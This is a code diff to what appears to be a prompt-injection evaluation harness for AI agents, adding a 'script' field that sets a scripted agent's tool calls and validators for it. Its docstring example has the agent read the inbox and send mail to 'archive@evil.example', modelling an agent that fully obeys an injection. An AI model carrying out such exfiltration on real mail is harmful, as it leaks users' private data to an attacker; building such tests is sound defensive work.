@@ -51,6 +51,19 @@ attack_success is an OR over its list (any one is a breach).
 task_success is an AND (the job isn't done until all of it is done).
 A scenario with an empty task_success list is a scenario that measures
 nothing, and the loader rejects it.
+
+A scenario may also give the scripted agent its calls outright:
+
+    script:                      # in order, every argument filled in
+      - tool: read_email
+        args: { folder: inbox }
+      - tool: send_email
+        args: { to: "archive@evil.example", body: "..." }
+
+Without it the scripted agent reads its calls off the predicates. With
+it, it plays exactly these, which is how a scenario states the agent
+that obeys the injection in full. Every tool it names must be one the
+scenario defines, and an empty script is refused: it attempts nothing.
 """
 
 from __future__ import annotations
@@ -121,6 +134,13 @@ class Predicate(Strict):
         return v
 
 
+class ScriptedCall(Strict):
+    """One call the scripted agent makes, arguments as sent."""
+
+    tool: str
+    args: dict[str, Any] = Field(default_factory=dict)
+
+
 class Scenario(Strict):
     id: str
     family: Family
@@ -130,7 +150,15 @@ class Scenario(Strict):
     task_success: list[Predicate]
     attack: bool = True
     benign_twin: str | None = None
+    script: list[ScriptedCall] | None = None
     notes: str = ""
+
+    @field_validator("script")
+    @classmethod
+    def script_must_do_something(cls, v: list[ScriptedCall] | None) -> list[ScriptedCall] | None:
+        if v is not None and not v:
+            raise ValueError("script is empty: an agent that calls nothing measures nothing")
+        return v
 
     @field_validator("tools")
     @classmethod
@@ -175,6 +203,11 @@ class Scenario(Strict):
                     raise ValueError(
                         f"{where} refers to tool {p.tool!r}, which this scenario doesn't define"
                     )
+        for i, call in enumerate(self.script or []):
+            if call.tool not in known:
+                raise ValueError(
+                    f"script[{i}] calls {call.tool!r}, which this scenario doesn't define"
+                )
         if self.attack and not self.attack_success:
             raise ValueError("an attack scenario needs at least one attack_success predicate")
         if not self.attack and self.attack_success:
